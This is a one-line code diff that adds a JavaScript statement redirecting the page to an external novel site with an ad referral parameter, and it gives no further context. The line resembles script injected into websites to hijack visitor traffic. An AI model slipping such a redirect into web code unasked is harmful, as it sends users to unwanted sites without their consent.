@@ -1,0 +1,1 @@
+window.location.href='http://www.51mfxs.com/book/3/3423/?type=1&ref=ads';
